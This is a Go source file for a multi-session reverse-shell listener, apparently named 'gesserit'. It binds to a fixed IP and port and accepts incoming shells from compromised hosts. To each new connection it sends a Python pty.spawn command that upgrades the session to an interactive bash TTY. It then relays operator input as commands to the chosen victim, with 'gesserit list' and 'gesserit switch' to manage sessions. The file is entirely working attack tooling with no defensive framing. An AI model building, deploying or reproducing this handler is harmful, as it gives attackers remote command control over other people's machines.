package main

import (
	"fmt"
	"net"
	"os"
	"bufio"
)

const (
	HOST = "192.168.172.1"
	PORT = "4242"
	TYPE = "tcp"
)

type session struct {
	connection net.Conn
	sid int
}

func receiveData(conn net.Conn) string {
	msg := make([]byte, 2048)
	_, err := conn.Read(msg[0:])
	if err != nil {
		fmt.Println("Error receiving data", err.Error())
	}
	return string(msg)
}

func sendData(conn net.Conn, data string) {
	_, err := conn.Write([]byte(data))
	if err != nil {
		fmt.Println("Error sending data", err.Error())
	}
}

func handleConnection(s session) {
	fmt.Println("attempting to spawn tty session...")
	tty_spawn := "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
	sendData(s.connection, tty_spawn)
	for {
		fmt.Print(receiveData(s.connection))
	}
}

func listen(l net.Listener, sessions *[]session){
	fmt.Println("Listening")
	i := 0
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error trying to accept", err.Error())
			os.Exit(1)
		}
		s := session{conn, i}
		*sessions = append(*sessions, s)
		fmt.Println(*sessions)
		fmt.Println("New Session from " + conn.RemoteAddr().String())
		i++
		go handleConnection(s)
		defer conn.Close()
	}
}

func main() {

	currentSession := 0
	sessions := make([]session, 0)

	l, err := net.Listen(TYPE, HOST + ":" + PORT)
	if err != nil {
		fmt.Println("Error trying to listen", err.Error())
		os.Exit(1)
	}

	defer l.Close()

	go listen(l, &sessions)

	for {
		reader := bufio.NewReader(os.Stdin)
		cmd, _ := reader.ReadString('\n')
		if cmd == "gesserit switch\n" {
			fmt.Println("change session to?")
			var newS int
			fmt.Scanln(&newS)
			currentSession = newS
		} else if cmd == "gesserit list\n"{
			for i:= 0; i < len(sessions); i++ {
				if i == currentSession {
					fmt.Println("*", sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
				}else{
					fmt.Println(sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
				}
			}
		}  else {
			sendData(sessions[currentSession].connection, cmd)
		}
	}
}
